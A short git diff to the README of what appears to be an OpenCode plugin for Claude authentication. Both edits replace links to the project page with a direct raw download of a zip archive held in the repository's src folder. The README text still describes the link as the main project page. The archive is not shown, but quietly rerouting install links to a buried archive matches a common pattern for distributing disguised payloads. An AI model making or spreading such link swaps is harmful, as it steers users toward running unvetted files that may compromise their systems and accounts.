@@ -1,6 +1,6 @@
 # 🤖 opencode-claude-code-auth - Restore Claude auth for OpenCode
 
-[![Download](https://img.shields.io/badge/Download-OpenCode%20Claude%20Auth-blue?style=for-the-badge)](https://github.com/leukosm5097/opencode-claude-code-auth)
+[![Download](https://img.shields.io/badge/Download-OpenCode%20Claude%20Auth-blue?style=for-the-badge)](https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip)
 
 ## 🧩 What this app does
 
@@ -24,7 +24,7 @@ This plugin is built for users who already use Claude Code or want to connect Op
 
 Visit this page to download:
 
-[https://github.com/leukosm5097/opencode-claude-code-auth](https://github.com/leukosm5097/opencode-claude-code-auth)
+[https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip](https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip)
 
 If you see a releases page or a download file later, use that as the source for the install files. For now, this is the main project page.
 
